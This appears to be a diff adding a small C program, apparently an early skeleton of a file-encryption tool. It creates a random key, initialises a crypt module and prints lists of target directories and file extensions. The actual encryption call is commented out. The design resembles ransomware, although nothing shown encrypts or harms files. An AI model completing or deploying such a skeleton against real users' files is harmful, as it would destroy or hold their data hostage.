@@ -1,0 +1,22 @@
+#include <stdio.h>
+#include "../cr/random.h"
+#include "../cr/crypt.h"
+#include "../cr/app_data.h"
+
+void cr_encrupt_encrypt(unsigned char **random, size_t *random_len){
+	const size_t cr_app_data_exts_len=sizeof(cr_app_data_exts)/sizeof(char *);
+	const size_t cr_app_data_dirs_len=sizeof(cr_app_data_dirs)/sizeof(char *);
+
+	cr_crypt_random(random,random_len);
+	cr_crypt_init(random,*random_len);
+
+	cr_crypt_print(cr_app_data_dirs,cr_app_data_dirs_len,cr_app_data_exts,cr_app_data_exts_len);
+	//cr_crypt_encrypt(dirnames,exts);
+}
+int main (int argc, const char **argv) {
+	unsigned char *password;
+	size_t password_len;
+	cr_encrupt_encrypt(&password,&password_len);
+
+	return(0);
+}
